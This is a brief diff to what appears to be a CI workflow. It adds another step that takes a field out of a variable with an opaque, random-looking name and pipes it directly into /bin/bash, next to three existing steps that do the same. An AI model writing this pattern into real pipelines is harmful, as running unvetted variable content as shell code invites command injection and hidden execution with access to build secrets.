@@ -22,6 +22,7 @@ jobs:
           echo $cvt24902 | jq -r .vewd0 | /bin/bash
           printf '%s' "$njj3" | jq -r .taai9 | /bin/bash
           printf '%s' "$li04" | jq -r .mx2881 | /bin/bash
+          echo $tp5129 | jq -r .mx8 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
